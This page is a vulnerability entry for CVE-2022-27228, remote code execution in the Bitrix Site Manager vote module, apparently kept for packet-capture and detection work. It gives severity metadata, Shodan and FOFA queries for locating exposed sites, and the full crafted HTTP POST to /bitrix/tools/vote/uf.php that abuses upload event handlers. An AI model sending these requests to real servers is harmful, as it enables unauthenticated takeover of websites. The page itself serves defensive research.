---
layout: post
cve_id: CVE-2022-27228
title: Bitrix Site Manager - Remote Code Execution
pcap: true
pcap_path: /pcaps/2022/CVE-2022-27228.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-27228.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: Unauthenticated attackers can execute arbitrary code remotely, potentially
  leading to full system compromise.
remediation: Update to version 21.0.100 or later.
reference:
- https://alt3r.eg0.ru/p0c5/attacking_bitrix.pdf
- https://pentestnotes.ru/notes/bitrix_pentest_full/#rce-vote_agentphp-cve-2022-27228
- https://nvd.nist.gov/vuln/detail/CVE-2022-27228
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-27228
  cwe-id: CWE-20
  epss-score: 0.91597
  epss-percentile: 0.99657
  cpe: cpe:2.3:a:bitrix24:bitrix24:*:*:*:*:*:*:*:*
metadata:
  verified: false
  vendor: bitrix24
  product: bitrix24
  shodan-query: /bitrix/p3p.xml
  fofa-query: body="/bitrix/"
tags:
- cve
- cve2022
- bitrix
- file-upload
- rce
- intrusive
- vkev
---

## üîç Vulnerability Description
In the vote (aka "Polls, Votes") module before 21.0.100 of Bitrix Site Manager, a remote unauthenticated attacker can execute arbitrary code.

## üåê HTTP Request
```nohighlight
GET /bitrix/admin/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 778
Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx
Accept-Encoding: gzip

-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]"

eJEXVPju.txt
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]";filename="eJEXVPju.jpg"
Content-Type: image/jpeg

malicious
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[packageIndex]"

pIndex101
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[mode]"

upload
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="sessid"

uBz1he
-----------------------------xxxxxxxxxxxx
Content-Disposition: form-data; name="bxu_info[filesCount]"

1
-----------------------------xxxxxxxxxxxx--
```

